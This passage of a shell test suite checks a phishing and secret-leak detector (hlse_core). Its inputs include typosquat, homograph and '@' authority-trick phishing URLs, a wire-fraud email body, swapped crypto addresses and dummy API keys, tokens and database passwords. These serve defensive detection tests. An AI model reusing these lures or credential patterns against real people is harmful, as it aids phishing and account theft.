    && check "canonical: typosquat shows real discord domain" "0" "0" \
    || check "canonical: typosquat shows real discord domain" "0" "1"
# Homoglyph: canonical appears alongside the substitution warning.
./hlse_core "https://paypa1.com/signin" 2>&1 | grep -qi "Legitimate 'paypal': paypal.com" \
    && check "canonical: homoglyph shows real paypal domain" "0" "0" \
    || check "canonical: homoglyph shows real paypal domain" "0" "1"
# Brand impersonation: hyphen+security-word gets canonical.
./hlse_core "https://paypal-verify.xyz/login" 2>&1 | grep -qi "Legitimate 'paypal': paypal.com" \
    && check "canonical: brand impersonation shows canonical" "0" "0" \
    || check "canonical: brand impersonation shows canonical" "0" "1"
# Non-obvious canonical: zoom.us not zoom.com.
./hlse_core "https://paypa1.zoom.us.attacker.com/meeting" 2>&1 | grep -qi "Legitimate 'zoom': zoom.us" \
    && check "canonical: subdomain spoofing shows zoom.us (not zoom.com)" "0" "0" \
    || check "canonical: subdomain spoofing shows zoom.us (not zoom.com)" "0" "1"
# Dedup: when two brand detectors fire on the same brand, the canonical line
# appears exactly once (not duplicated).
CANON_DUPS=$(./hlse_core "https://paypal.evilsite.netlify.app/signin" 2>&1 \
    | grep -c "Legitimate 'paypal': paypal.com")
check "canonical: dedup → single canonical line for repeated brand" "1" "$CANON_DUPS"
# JSON: canonical reason appears in reasons array.
if command -v python3 >/dev/null 2>&1; then
    CANON_JSON=""; CANON_JSON=$(./hlse_core --json "https://discordd.com/login" 2>/dev/null) || true
    echo "$CANON_JSON" | python3 -c "
import json,sys
d=json.loads(sys.stdin.read())
found=any('discord.com' in r for r in d.get('reasons',[]))
raise SystemExit(0 if found else 1)
" 2>/dev/null \
        && check "canonical: JSON reasons contain canonical domain" "0" "0" \
        || check "canonical: JSON reasons contain canonical domain" "0" "1"
fi

# ─── Attack pattern synthesis ────────────────────────────────────────
# Typosquat + phishing path → "typosquat credential-harvest page"
./hlse_core "https://discordd.com/login" 2>&1 | grep -qi "Pattern:.*typosquat" \
    && check "pattern: typosquat+path → typosquat credential-harvest page" "0" "0" \
    || check "pattern: typosquat+path → typosquat credential-harvest page" "0" "1"
# IDN homograph → "Unicode/IDN homograph impersonation"
./hlse_core "https://xn--pple-43d.com" 2>&1 | grep -qi "Pattern:.*IDN\|Pattern:.*Unicode" \
    && check "pattern: IDN homograph → Unicode/IDN classification" "0" "0" \
    || check "pattern: IDN homograph → Unicode/IDN classification" "0" "1"
# Brand-hyphen + suspicious TLD + path → "brand-hyphen credential-harvest page"
./hlse_core "https://paypal-verify.xyz/login" 2>&1 | grep -qi "Pattern:.*brand.*hyphen\|Pattern:.*hyphen.*brand" \
    && check "pattern: brand-hyphen+TLD+path → brand-hyphen credential-harvest" "0" "0" \
    || check "pattern: brand-hyphen+TLD+path → brand-hyphen credential-harvest" "0" "1"
# @ authority trick → "authority-trick credential phishing"
./hlse_core "https://www.paypal.com@evil.ru/login" 2>&1 | grep -qi "Pattern:.*authority" \
    && check "pattern: @ authority trick → authority-trick phishing" "0" "0" \
    || check "pattern: @ authority trick → authority-trick phishing" "0" "1"
# URL shortener → "obfuscated link" pattern
./hlse_core "https://bit.ly/3AbCdEf" 2>&1 | grep -qi "Pattern:.*obfuscat\|Pattern:.*shortener" \
    && check "pattern: shortener → obfuscated link classification" "0" "0" \
    || check "pattern: shortener → obfuscated link classification" "0" "1"
# Clean URL must NOT have a Pattern line
./hlse_core "https://www.google.com" 2>&1 | grep -qi "Pattern:" \
    && check "pattern: clean URL has no Pattern line" "0" "1" \
    || check "pattern: clean URL has no Pattern line" "0" "0"
# JSON output includes 'pattern' field for threat URLs
if command -v python3 >/dev/null 2>&1; then
    PAT_JSON=""; PAT_JSON=$(./hlse_core --json "https://discordd.com/login" 2>/dev/null) || true
    echo "$PAT_JSON" | python3 -c "
import json,sys
d=json.loads(sys.stdin.read())
raise SystemExit(0 if 'pattern' in d else 1)
" 2>/dev/null \
        && check "pattern: JSON includes 'pattern' field for threat URL" "0" "0" \
        || check "pattern: JSON includes 'pattern' field for threat URL" "0" "1"
fi

# ─── JSON control-char escaping ─────────────────────────────────────
# A secret file containing a control byte must still produce valid JSON
# (the \uXXXX escape path).
if command -v python3 >/dev/null 2>&1; then
    JE_DIR=$(mktemp -d)
    printf 'secret\x01ctrl = AKIA2E3MWORQXYZ4567PQ\n' > "$JE_DIR/c.env"
    ./hlse_core --json scan "$JE_DIR" 2>/dev/null | \
        python3 -c "import json,sys; [json.loads(l) for l in sys.stdin if l.strip()]" 2>/dev/null \
        && check "JSON: control char → valid \\uXXXX escape" "0" "0" \
        || check "JSON: control char → valid \\uXXXX escape" "0" "1"
    rm -rf "$JE_DIR"
fi

# ─── secret / email / clipboard subcommands (CLI exposure of library) ─

# secret: detects a leaked key from an argument
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -qE "AWS|ISOLATE|BLOCK" \
    && check "secret: detects AWS key (arg)" "0" "0" \
    || check "secret: detects AWS key (arg)" "0" "1"

# confidence: a fixed-prefix key is reported as 'certain'
./hlse_core secret "AKIA2E3MWORQXYZ4567PQ" 2>&1 | grep -q "confidence: certain" \
    && check "confidence: fixed-prefix key → certain" "0" "0" \
    || check "confidence: fixed-prefix key → certain" "0" "1"

# confidence: a generic VAR=value is reported as 'heuristic' (a pattern guess)
./hlse_core secret "PASSWORD=please-knock-first" 2>&1 | grep -q "confidence: heuristic" \
    && check "confidence: generic env var → heuristic" "0" "0" \
    || check "confidence: generic env var → heuristic" "0" "1"

# confidence: JSON exposes the 'confidence' field
./hlse_core --json secret "PASSWORD=hunter2value" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["confidence"] in ("certain","heuristic")
' && check "confidence: JSON secret has confidence field" "0" "0" \
   || check "confidence: JSON secret has confidence field" "0" "1"

# remediation: an actionable verdict (>=60) carries a next-action directive
./hlse_core clipboard "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf" "1BoatSLRHtKNngkdXEeobR76b53LETtpyT" 2>&1 \
    | grep -q "Action:" \
    && check "remediation: clipboard hijack shows next-action" "0" "0" \
    || check "remediation: clipboard hijack shows next-action" "0" "1"

# remediation: JSON exposes a 'remediation' field on an actionable secret
./hlse_core --json secret "AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] >= 60 and d.get("remediation")
' && check "remediation: JSON secret has remediation field" "0" "0" \
   || check "remediation: JSON secret has remediation field" "0" "1"

# remediation: a sub-threshold (LOG) verdict must NOT carry an action line
./hlse_core email "From: a@b.com
Reply-To: c@d.com
Subject: hello" 2>&1 | grep -q "Action:" \
    && check "remediation: LOG verdict has no action line" "0" "1" \
    || check "remediation: LOG verdict has no action line" "0" "0"

# secret: reads from stdin
printf 'token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n' \
    | ./hlse_core secret --stdin 2>&1 | grep -q "GitHub" \
    && check "secret: detects from stdin" "0" "0" \
    || check "secret: detects from stdin" "0" "1"

# secret: clean text → exit 0
./hlse_core secret "just some normal prose" >/dev/null 2>&1
check "secret: clean text exits 0" "0" "$?"

# secret: leaked key → exit 1
./hlse_core secret "key=AKIA2E3MWORQXYZ4567PQ" >/dev/null 2>&1 && rc=0 || rc=$?
check "secret: leaked key exits 1" "1" "$rc"

# secret: no-arg → exit 2 (usage error; must not treat non-tty CI stdin as input)
./hlse_core secret </dev/null >/dev/null 2>&1 && rc=0 || rc=$?
check "secret: no-arg exits 2" "2" "$rc"

# secret: JSON parseable with findings
./hlse_core --json secret "key=AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "secret" and "findings" in d
' && check "--json secret parseable" "0" "0" \
   || check "--json secret parseable" "0" "1"

# secret: signed JWT bearer token detected
./hlse_core secret "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" 2>&1 | grep -qi "JWT" \
    && check "secret: signed JWT bearer token → detected" "0" "0" \
    || check "secret: signed JWT bearer token → detected" "0" "1"

# secret FP guard: unsigned 2-segment token must NOT be flagged as a JWT
./hlse_core secret "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0" 2>&1 | grep -qi "JWT" \
    && check "secret: unsigned 2-segment token NOT flagged" "0" "1" \
    || check "secret: unsigned 2-segment token NOT flagged" "0" "0"

# secret: AWS credentials file format (lowercase keys + spaces around '=')
./hlse_core secret "aws_secret_access_key = wJalrXUtnFEMItesting7bPxRfiCYzABCD1234567" 2>&1 | grep -qi "AWS secret" \
    && check "secret: AWS creds-file (lowercase+spaces) → detected" "0" "0" \
    || check "secret: AWS creds-file (lowercase+spaces) → detected" "0" "1"

# secret FP guard: a placeholder AWS secret value must NOT be flagged
./hlse_core secret "aws_secret_access_key = YOUR_SECRET_KEY_HERE_PLACEHOLDER_XXXXXXX" 2>&1 | grep -qi "AWS secret" \
    && check "secret: placeholder AWS secret NOT flagged" "0" "1" \
    || check "secret: placeholder AWS secret NOT flagged" "0" "0"

# secret: Google OAuth client secret (GOCSPX- prefix)
./hlse_core secret "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" 2>&1 | grep -qi "OAuth Client Secret" \
    && check "secret: Google OAuth client secret → detected" "0" "0" \
    || check "secret: Google OAuth client secret → detected" "0" "1"

# secret: DB connection string with embedded password
./hlse_core secret "postgres://admin:Sup3rS3cr3tP4ss@db.internal.com:5432/maindb" 2>&1 | grep -qi "Embedded credentials" \
    && check "secret: DB URI with embedded password → detected" "0" "0" \
    || check "secret: DB URI with embedded password → detected" "0" "1"

# secret FP guard: a connection string with a ${VAR} password must NOT be flagged
./hlse_core secret 'postgres://admin:${DB_PASS}@db.com/main' 2>&1 | grep -qi "Embedded credentials" \
    && check "secret: URI with \${VAR} password NOT flagged" "0" "1" \
    || check "secret: URI with \${VAR} password NOT flagged" "0" "0"

# secret: newer LLM-provider keys (Groq / Perplexity / xAI distinctive prefixes)
./hlse_core secret "gsk_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJ" 2>&1 | grep -qi "Groq" \
    && check "secret: Groq API key → detected" "0" "0" \
    || check "secret: Groq API key → detected" "0" "1"
./hlse_core secret "pplx-abcdef0123456789abcdef0123456789abcdef0123" 2>&1 | grep -qi "Perplexity" \
    && check "secret: Perplexity API key → detected" "0" "0" \
    || check "secret: Perplexity API key → detected" "0" "1"
# FP guard: a short 'xai-' word must NOT be flagged (min 20-char body)
./hlse_core secret "the file is in xai-dir folder" 2>&1 | grep -qi "xAI" \
    && check "secret: short xai- word NOT flagged" "0" "1" \
    || check "secret: short xai- word NOT flagged" "0" "0"

# secret: bare Telegram bot token (<8-10 digits>:<35 base64url>)
./hlse_core secret "7123456789:AAH1234567890abcdefghijklmnopqrstuvw" 2>&1 | grep -qi "Telegram" \
    && check "secret: bare Telegram bot token → detected" "0" "0" \
    || check "secret: bare Telegram bot token → detected" "0" "1"

# secret FP guard: timestamps/ports must NOT be flagged as a Telegram token
./hlse_core secret "Server on 192.168.1.1:8080 since 12:34:56 today" 2>&1 | grep -qi "Telegram" \
    && check "secret: time/port NOT flagged as Telegram token" "0" "1" \
    || check "secret: time/port NOT flagged as Telegram token" "0" "0"

# email: display-name spoof detected from stdin
printf 'From: Microsoft Support <hacker@gmail.com>\nSubject: Verify\n' \
    | ./hlse_core email --stdin 2>&1 | grep -qE "E1|microsoft|spoof|Display" \
    && check "email: display-name spoof detected" "0" "0" \
    || check "email: display-name spoof detected" "0" "1"

# email: no-arg → exit 2
./hlse_core email </dev/null >/dev/null 2>&1 && rc=0 || rc=$?
check "email: no-arg exits 2" "2" "$rc"

# email: JSON parseable
./hlse_core --json email "From: a@b.com" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "email" and "reasons" in d
' && check "--json email parseable" "0" "0" \
   || check "--json email parseable" "0" "1"

# ─── Perspective 38: email body social-engineering lens ───────────────────────
# p38: BEC body surfaced as ▸ Body pattern advisory (header forensics is blind to body)
./hlse_core email "From: ceo@company.com
Subject: Urgent

Please wire \$50000 to new vendor immediately. Keep confidential, do not call." 2>/dev/null \
    | grep -q "Body pattern:.*BEC" \
    && check "p38: email surfaces BEC body pattern" "0" "0" \
    || check "p38: email surfaces BEC body pattern" "0" "1"

# p38: clean headers (score 0) do NOT mask a BEC body — OK line notes body flagged
./hlse_core email "From: ceo@company.com
Received: from mail.company.com by mx.company.com
DKIM-Signature: v=1; d=company.com
Subject: Request

Please wire \$50000 to new vendor immediately. Keep confidential, do not call anyone." 2>/dev/null \
    | grep -q "body flagged below" \
    && check "p38: clean headers do not mask BEC body" "0" "0" \
    || check "p38: clean headers do not mask BEC body" "0" "1"

# p38: benign body + clean headers stays OK with no body pattern
./hlse_core email "From: friend@example.com
Received: from mail.example.com
DKIM-Signature: v=1
Subject: Lunch

Want to grab lunch tomorrow?" 2>/dev/null \
    | grep -q "no spoofing signals" \
    && check "p38: benign email stays clean OK" "0" "0" \
    || check "p38: benign email stays clean OK" "0" "1"

# p38 json: body_pattern and body_score fields present for BEC body
./hlse_core --json email "From: ceo@company.com
Subject: Urgent

Please wire \$50000 immediately. Keep confidential, do not call." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "body_pattern" in d and "BEC" in d["body_pattern"], d
assert d.get("body_score", 0) >= 40, d
' && check "p38 json: email exposes body_pattern/body_score" "0" "0" \
   || check "p38 json: email exposes body_pattern/body_score" "0" "1"

# p38 json: benign email has no body_pattern field
./hlse_core --json email "From: a@b.com" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "body_pattern" not in d, d
' && check "p38 json: benign email has no body_pattern" "0" "0" \
   || check "p38 json: benign email has no body_pattern" "0" "1"

# p38: --from help text mentions text scoring (not just URL)
./hlse_core --help 2>&1 | grep -q "boosts URL & text score" \
    && check "p38: --from help reflects text channel support" "0" "0" \
    || check "p38: --from help reflects text channel support" "0" "1"

# clipboard: same address → no swap (exit 0)
./hlse_core clipboard \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" >/dev/null 2>&1
check "clipboard: identical address exits 0" "0" "$?"

# clipboard: swapped address → BLOCK (exit 1)
./hlse_core clipboard \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" \
    "bc1q9h6tq358tcssvfjafy2dajfu7lk6f35c9cn3t2" >/dev/null 2>&1 && rc=0 || rc=$?
check "clipboard: swapped address exits 1" "1" "$rc"

# clipboard: JSON has is_swap
./hlse_core --json clipboard \
    "0xabcdef0000000000000000000000000000c0ffee" \
    "0xabcdef1111111111111111111111111111c0ffee" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "clipboard" and d["is_swap"] == 1 and d["score"] == 100
' && check "--json clipboard vanity → score 100" "0" "0" \
   || check "--json clipboard vanity → score 100" "0" "1"

# ─── Advisory parity: the three URL output paths must not drift ─────────────
# print_url_advisories() centralises Pattern/Disguised/Objective/Safe/Verify/
# Triage so the stdin, `text` subcommand, and default paths cannot diverge.
# Compare the advisory lines (markers ▸ ⌖ ◉ → ✓ ⚑) across all three.
ADV_DEFAULT=$(./hlse_core "https://paypa1.com/login" 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
ADV_TEXT=$(./hlse_core text "https://paypa1.com/login" 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
ADV_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
[ "$ADV_DEFAULT" = "$ADV_TEXT" ] \
    && check "advisory parity: default == text subcommand" "0" "0" \
    || check "advisory parity: default == text subcommand" "0" "1"
[ "$ADV_DEFAULT" = "$ADV_STDIN" ] \
    && check "advisory parity: default == stdin" "0" "0" \
    || check "advisory parity: default == stdin" "0" "1"

# ─── Perspective 16: Canonical confirmation ("positively confirmed safe") ───
# Socratic Q: "'OK' means 'nothing wrong found' — absence of evidence. But for
# a URL that exactly matches a canonical brand domain, HLSE has POSITIVE
# evidence of legitimacy. Why not say so explicitly?"

# Known canonical brand domain → emits Canonical confirmation
CAN_PAY=$(./hlse_core "https://paypal.com" 2>/dev/null)
echo "$CAN_PAY" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical: paypal.com → confirmed" "0" "0" \
    || check "canonical: paypal.com → confirmed" "0" "1"

# www. prefix is stripped for matching
CAN_ZOOM=$(./hlse_core "https://www.zoom.us" 2>/dev/null)
echo "$CAN_ZOOM" | grep -q "Canonical: confirmed authentic zoom" \
    && check "canonical: www.zoom.us → confirmed (www stripped)" "0" "0" \
    || check "canonical: www.zoom.us → confirmed (www stripped)" "0" "1"

# Non-canonical clean URL → NO canonical line
CAN_NONE=$(./hlse_core "https://example.com" 2>/dev/null)
echo "$CAN_NONE" | grep -q "Canonical:" \
    && check "canonical: absent for non-brand URL" "0" "1" \
    || check "canonical: absent for non-brand URL" "0" "0"

# Threat URL (fake domain) → NO canonical confirmation (score > 0)
CAN_FAKE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$CAN_FAKE" | grep -q "Canonical:" \
    && check "canonical: absent for threat URL" "0" "1" \
    || check "canonical: absent for threat URL" "0" "0"

# JSON emits canonical_brand for confirmed domains
CAN_JSON=$(./hlse_core --json "https://paypal.com" 2>/dev/null)
echo "$CAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("canonical_brand") == "paypal", d
assert d.get("score") == 0, d
' && check "canonical json: canonical_brand=paypal" "0" "0" \
   || check "canonical json: canonical_brand=paypal" "0" "1"

# JSON omits canonical_brand for non-brand clean URL
CAN_JSON_NONE=$(./hlse_core --json "https://example.com" 2>/dev/null)
echo "$CAN_JSON_NONE" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "canonical_brand" not in d, d
' && check "canonical json: absent for non-brand URL" "0" "0" \
   || check "canonical json: absent for non-brand URL" "0" "1"

# stdin pipe mode emits canonical for a clean brand domain
CAN_STDIN=$(echo "https://paypal.com" | ./hlse_core --stdin 2>/dev/null)
echo "$CAN_STDIN" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical stdin: confirmed shown" "0" "0" \
    || check "canonical stdin: confirmed shown" "0" "1"

# text subcommand OK-path also surfaces canonical confirmation (parity)
CAN_TEXT=$(./hlse_core text "https://paypal.com" 2>/dev/null)
echo "$CAN_TEXT" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical: text subcommand → confirmed (parity)" "0" "0" \
    || check "canonical: text subcommand → confirmed (parity)" "0" "1"

# Non-obvious canonical (zoom.us, not zoom.com) is confirmed correctly
CAN_ZOOM_IO=$(./hlse_core "https://zoom.us" 2>/dev/null)
echo "$CAN_ZOOM_IO" | grep -q "Canonical: confirmed authentic zoom" \
    && check "canonical: zoom.us (non-obvious TLD) confirmed" "0" "0" \
    || check "canonical: zoom.us (non-obvious TLD) confirmed" "0" "1"

# ─── Perspective 15: Incident triage ("if you already clicked") ─────────────
# Socratic Q: "People typically notice something's wrong AFTER submitting
# credentials. At that moment 'BLOCK' is useless — they need triage: what to
# do in the next 60 seconds to minimise damage."

# BLOCK-band payment brand → financial card-block triage
TRI_PAY=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$TRI_PAY" | grep -q "If already clicked:" \
    && check "triage: BLOCK brand → triage line shown" "0" "0" \
    || check "triage: BLOCK brand → triage line shown" "0" "1"
echo "$TRI_PAY" | grep -q "card" \
    && check "triage: payment brand → card-block guidance" "0" "0" \
    || check "triage: payment brand → card-block guidance" "0" "1"

# BLOCK-band corporate SSO → IT-team notification triage
TRI_SSO=$(./hlse_core "https://okta-enterprise-login.com/signin" 2>/dev/null) || true
echo "$TRI_SSO" | grep -q "IT/security team" \
    && check "triage: corporate SSO → IT-team notification" "0" "0" \
    || check "triage: corporate SSO → IT-team notification" "0" "1"

# ALERT-band URL (<60) → NO triage line (band boundary must be respected)
TRI_ALERT=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$TRI_ALERT" | grep -q "If already clicked" \
    && check "triage: absent below score 60" "0" "1" \
    || check "triage: absent below score 60" "0" "0"

# Clean URL → no triage line
TRI_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$TRI_CLEAN" | grep -q "If already clicked" \
    && check "triage: absent for clean URL" "0" "1" \
    || check "triage: absent for clean URL" "0" "0"

# Text input → no triage line
TRI_TXT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$TRI_TXT" | grep -q "If already clicked" \
    && check "triage: absent for text input" "0" "1" \
    || check "triage: absent for text input" "0" "0"

# JSON exposes the triage field for a BLOCK-band URL
TRI_JSON=""; TRI_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$TRI_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("triage"), d
' && check "triage json: triage field present (BLOCK)" "0" "0" \
   || check "triage json: triage field present (BLOCK)" "0" "1"

# JSON omits triage for an ALERT-band URL
TRI_ALERT_JSON=""; TRI_ALERT_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$TRI_ALERT_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" not in d, d
' && check "triage json: absent below score 60" "0" "0" \
   || check "triage json: absent below score 60" "0" "1"

# stdin pipe mode emits triage for a BLOCK-band URL
TRI_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$TRI_STDIN" | grep -q "If already clicked:" \
    && check "triage stdin: triage line shown" "0" "0" \
    || check "triage stdin: triage line shown" "0" "1"

# ─── Perspective 14: Independent verification ("how to check me") ──────────
# Socratic Q: "What ONE check can the user run right now — without trusting
# HLSE — to confirm the verdict before they act?" High-confidence (>=60)
# mirror of exoneration (15..59); the two bands never overlap.

# BLOCK-band brand verdict → emits a Verify-independently check
VRF_BLOCK=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$VRF_BLOCK" | grep -q "Verify independently:" \
    && check "verify: BLOCK brand → verify line shown" "0" "0" \
    || check "verify: BLOCK brand → verify line shown" "0" "1"

# BLOCK band must NOT also show the low-band exoneration ("Could be benign")
echo "$VRF_BLOCK" | grep -q "Could be benign" \
    && check "verify: BLOCK band suppresses exoneration" "0" "1" \
    || check "verify: BLOCK band suppresses exoneration" "0" "0"

# ALERT-band verdict (<60) → NO verify line (exoneration band instead)
VRF_ALERT=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$VRF_ALERT" | grep -q "Verify independently" \
    && check "verify: absent below score 60" "0" "1" \
    || check "verify: absent below score 60" "0" "0"

# ALERT band still shows exoneration (the complementary band)
echo "$VRF_ALERT" | grep -q "Could be benign" \
    && check "verify: ALERT band keeps exoneration" "0" "0" \
    || check "verify: ALERT band keeps exoneration" "0" "1"

# Clean URL → no verify line
VRF_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$VRF_CLEAN" | grep -q "Verify independently" \
    && check "verify: absent for clean URL" "0" "1" \
    || check "verify: absent for clean URL" "0" "0"

# JSON exposes the verify field for a BLOCK-band URL
VRF_JSON=""; VRF_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$VRF_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("verify"), d
' && check "verify json: verify field present (BLOCK)" "0" "0" \
   || check "verify json: verify field present (BLOCK)" "0" "1"

# JSON omits verify for an ALERT-band URL
VRF_ALERT_JSON=""; VRF_ALERT_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$VRF_ALERT_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "verify" not in d, d
' && check "verify json: absent below score 60" "0" "0" \
   || check "verify json: absent below score 60" "0" "1"

# stdin pipe mode emits the verify line for a BLOCK-band URL
VRF_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$VRF_STDIN" | grep -q "Verify independently:" \
    && check "verify stdin: verify line shown" "0" "0" \
    || check "verify stdin: verify line shown" "0" "1"

# ─── Perspective 13: Confusable forensics ("show the disguise") ────────────
# Socratic Q: "You said 'mixed-script homoglyph' and then showed the user the
# very string their eyes glossed over. Which exact character is the impostor?"

# Cyrillic homograph → pinpoints the disguised codepoint
CONF_CYR=$(./hlse_core "https://раypal.com" 2>/dev/null) || true
echo "$CONF_CYR" | grep -q "Disguised char: position 1 is Cyrillic U+0440" \
    && check "confusable: Cyrillic → U+0440 pinpointed" "0" "0" \
    || check "confusable: Cyrillic → U+0440 pinpointed" "0" "1"

# Pure-ASCII homoglyph (g00gle) → NO disguised-char line (all bytes are ASCII)
CONF_ASCII=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$CONF_ASCII" | grep -q "Disguised char" \
    && check "confusable: absent for pure-ASCII homoglyph" "0" "1" \
    || check "confusable: absent for pure-ASCII homoglyph" "0" "0"

# Clean ASCII URL → NO disguised-char line
CONF_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$CONF_CLEAN" | grep -q "Disguised char" \
    && check "confusable: absent for clean URL" "0" "1" \
    || check "confusable: absent for clean URL" "0" "0"

# JSON exposes the confusable field for a mixed-script host
CONF_JSON=""; CONF_JSON=$(./hlse_core --json "https://раypal.com" 2>/dev/null) || true
echo "$CONF_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "Cyrillic" in d.get("confusable","") and "U+0440" in d.get("confusable",""), d
' && check "confusable json: field present" "0" "0" \
   || check "confusable json: field present" "0" "1"

# JSON omits confusable for a pure-ASCII host
CONF_ASCII_JSON=""; CONF_ASCII_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$CONF_ASCII_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "confusable" not in d, d
' && check "confusable json: absent for ASCII host" "0" "0" \
   || check "confusable json: absent for ASCII host" "0" "1"

# stdin pipe mode emits the disguised-char line too
CONF_STDIN=$(echo "https://раypal.com" | ./hlse_core --stdin 2>/dev/null) || true
echo "$CONF_STDIN" | grep -q "Disguised char: position 1 is Cyrillic" \
    && check "confusable stdin: disguised char shown" "0" "0" \
    || check "confusable stdin: disguised char shown" "0" "1"

# ─── Perspective 12: Attacker Objective ("what are they after?") ───────────
# Socratic Q: "You named HOW the attack works and WHERE to go instead — but
# never WHAT the attacker is after. Doesn't the stake decide how hard the user
# should care?"

# Crypto brand → irreversible-theft objective
OBJ_CRYPTO=$(./hlse_core "https://metamask-wallet.com/connect-wallet" 2>/dev/null) || true
echo "$OBJ_CRYPTO" | grep -q "Attacker's goal: crypto theft" \
    && check "objective: crypto brand → crypto theft" "0" "0" \
    || check "objective: crypto brand → crypto theft" "0" "1"

# Payment brand → financial-account-takeover objective
OBJ_PAY=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$OBJ_PAY" | grep -q "Attacker's goal: financial-account takeover" \
    && check "objective: payment brand → financial takeover" "0" "0" \
    || check "objective: payment brand → financial takeover" "0" "1"

# Identity brand → email/identity-keystone objective
OBJ_ID=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$OBJ_ID" | grep -q "Attacker's goal: email/identity takeover" \
    && check "objective: identity brand → identity takeover" "0" "0" \
    || check "objective: identity brand → identity takeover" "0" "1"

# Clean URL with no brand → no objective line
OBJ_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$OBJ_CLEAN" | grep -q "Attacker's goal" \
    && check "objective: absent for clean URL" "0" "1" \
    || check "objective: absent for clean URL" "0" "0"

# Text input → no objective line
OBJ_TXT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$OBJ_TXT" | grep -q "Attacker's goal" \
    && check "objective: absent for text input" "0" "1" \
    || check "objective: absent for text input" "0" "0"

# JSON exposes the objective field for a brand-impersonation URL
OBJ_JSON=""; OBJ_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$OBJ_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "financial-account takeover" in d.get("objective",""), d
' && check "objective json: objective field present" "0" "0" \
   || check "objective json: objective field present" "0" "1"

# JSON omits objective when no brand is matched
OBJ_CLEAN_JSON=""; OBJ_CLEAN_JSON=$(./hlse_core --json "https://example.com" 2>/dev/null) || true
echo "$OBJ_CLEAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "objective" not in d, d
' && check "objective json: absent when clean" "0" "0" \
   || check "objective json: absent when clean" "0" "1"

# stdin pipe mode emits the objective too
OBJ_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$OBJ_STDIN" | grep -q "Attacker's goal: financial-account takeover" \
    && check "objective stdin: objective shown" "0" "0" \
    || check "objective stdin: objective shown" "0" "1"

# ─── Perspective 11: Safe Destination ("did you mean") ─────────────────────
# Socratic Q: "You blocked the counterfeit — but the user still has the
# legitimate need. You already know the real domain. Shouldn't you hand it over
# so they don't re-search straight back into the same phishing net?"

# A brand-impersonation URL gets a navigable safe destination
SAFE_OUT=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$SAFE_OUT" | grep -q "Safe destination: https://paypal.com" \
